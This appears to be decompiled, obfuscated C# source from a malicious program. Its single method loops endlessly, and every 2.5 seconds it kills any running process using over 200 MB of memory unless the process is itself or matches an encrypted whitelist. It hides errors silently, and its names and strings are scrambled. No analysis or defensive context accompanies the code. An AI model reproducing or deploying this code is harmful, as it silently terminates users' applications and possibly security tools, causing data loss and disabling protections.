using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nZBhTHSmQawuU;

public static class lNJXcRNITkybw
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void wWnziLlBMlhr()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107461546)) && !process.ProcessName.Contains(getString_0(107461537)) && !process.ProcessName.Contains(getString_0(107461560)) && !process.ProcessName.Contains(getString_0(107461551)) && !process.ProcessName.Contains(getString_0(107461506)) && !process.ProcessName.Contains(getString_0(107461525)) && !process.ProcessName.Contains(getString_0(107461480)) && !process.ProcessName.Contains(getString_0(107461499)) && !process.ProcessName.Contains(getString_0(107461486)) && !process.ProcessName.Contains(getString_0(107461441)) && !process.ProcessName.Contains(getString_0(107461420)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static lNJXcRNITkybw()
	{
		Strings.CreateGetStringDelegate(typeof(lNJXcRNITkybw));
	}
}
